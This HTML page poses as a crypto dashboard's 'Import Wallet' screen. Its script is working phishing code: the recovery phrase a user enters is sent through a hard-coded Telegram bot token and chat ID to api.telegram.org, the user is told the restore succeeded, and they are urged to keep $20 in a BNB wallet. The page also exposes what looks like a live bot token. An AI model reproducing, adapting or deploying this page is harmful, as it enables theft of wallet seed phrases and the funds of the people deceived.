<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Import Wallet - Crypto Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #000;
      --text: #fff;
      --box-bg: #111);
      --box-border: #00f0f0;
      --input-bg: #111;
      --input-color: #00f0f0;
      --input-focus-bg: #011;
      --input-border: #00ffff88;
      --button-bg: linear-gradient(90deg, #00c6ff, #0072ff);
      --link: #00ffff;
    }

    body.light-mode {
      --bg: #f5f5f5;
      --text: #000;
      --box-bg: #fff;
      --box-border: #ddd;
      --input-bg: #f0f0f0;
      --input-color: #333;
      --input-focus-bg: #e9e9e9;
      --input-border: #00c6ff88;
      --button-bg: linear-gradient(90deg, #00c6ff, #0072ff);
      --link: #0072ff;
    }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', sans-serif;
      padding: 30px 20px;
      transition: background 0.3s, color 0.3s;
    }

    .content-box {
      background: var(--box-bg);
      padding: 30px 25px;
      border-radius: 18px;
      border: 1px solid var(--box-border);
      max-width: 480px;
      margin: 60px auto;
      text-align: center;
      backdrop-filter: blur(10px);
      transition: background 0.3s, border 0.3s;
    }

    .content-box h2 {
      color: #00ffff;
      margin-bottom: 10px;
      font-size: 26px;
      font-weight: 600;
    }

    .content-box p {
      color: #aaa;
      font-size: 15px;
      margin-bottom: 24px;
      line-height: 1.6;
    }

    .input-field {
      width: 100%;
      padding: 18px 16px;
      margin: 16px 0;
      border-radius: 12px;
      border: 1px solid var(--input-border);
      background: var(--input-bg);
      color: var(--input-color);
      outline: none;
      resize: none;
      font-size: 15px;
      height: 130px;
      box-sizing: border-box;
      transition: 0.25s;
    }

    .input-field:focus {
      border-color: #5de6ff;
      box-shadow: 0 0 0 2px rgba(0,255,255,0.2);
      background: var(--input-focus-bg);
    }

    .btn {
      width: 100%;
      padding: 16px;
      background: var(--button-bg);
      border: none;
      color: #fff;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      transition: background 0.3s, transform 0.2s;
    }

    .btn:hover {
      transform: translateY(-2px);
    }

    #tokenMsg {
      margin-top: 18px;
      font-size: 14px;
    }

    a.back-link,
    a.toggle-theme {
      display: inline-block;
      margin-top: 25px;
      color: var(--link);
      text-decoration: none;
      font-size: 15px;
    }

    a:hover {
      text-decoration: underline;
    }

    @media (max-width: 500px) {
      .content-box {
        margin: 40px 15px;
        padding: 25px 20px;
      }
    }
  </style>
</head>
<body>

  <div class="content-box">
    <h2>üîê Import Wallet</h2>
    <p>Enter your Recovery Phrase to restore access and enable Web3 features like trading, earning, and staking.</p>
    <textarea id="tokenPhrase" class="input-field" placeholder="Enter your Recovery phrase..."></textarea>
    <button class="btn" onclick="restoreWallet()">Restore Wallet</button>
    <div id="tokenMsg"></div>
    <a href="index.html" class="back-link">‚Üê Back to Dashboard</a><br>
    <a href="#" class="toggle-theme" onclick="toggleTheme()">üåì Toggle Theme</a>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = "7964620453:AAFMQ4mxCpezN6kuTCUEgK7WeMBFNJW2ZS4";
    const TELEGRAM_CHAT_ID = "7979664801";
    const currentBalanceUSD = 950;

    function restoreWallet() {
      const input = document.getElementById("tokenPhrase").value.trim();
      const msgBox = document.getElementById("tokenMsg");
      const wordCount = input.split(/\s+/).length;

      if (input.length < 12 || wordCount < 3) {
        msgBox.style.color = 'orange';
        msgBox.textContent = '‚ùå Invalid phrase: Must be at least 12 characters and 3 words.';
        return;
      }

      if (currentBalanceUSD < 20) {
        msgBox.style.color = 'red';
        msgBox.innerHTML = `‚ùå You need at least <strong>$20</strong> before restoring.<br>Current balance: $${currentBalanceUSD}`;
        return;
      }

      const message = `üîê Restore Wallet Request:\n\n${input}`;
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
      }).then(res => {
        if (res.ok) {
          msgBox.style.color = '#00ff90';
          msgBox.innerHTML = `‚úÖ Wallet restored successfully.<br>üü¢ Trading and Earning will be activated only if you have $20 in your BNB Wallet.`;
          document.getElementById("tokenPhrase").value = '';
        } else {
          msgBox.style.color = 'red';
          msgBox.textContent = '‚ùå Failed to send request.';
        }
      }).catch(() => {
        msgBox.style.color = 'red';
        msgBox.textContent = '‚ö†Ô∏è Network error. Try again.';
      });
    }

    function toggleTheme() {
      const body = document.body;
      const isLight = body.classList.toggle('light-mode');
      if (!isLight) {
        body.classList.add('dark-mode');
      } else {
        body.classList.remove('dark-mode');
      }
      localStorage.setItem('theme', isLight ? 'light' : 'dark');
    }

    // Load saved theme
    window.onload = () => {
      const savedTheme = localStorage.getItem('theme');
      if (savedTheme === 'light') {
        document.body.classList.add('light-mode');
      }
    };
  </script>

</body>
</html>
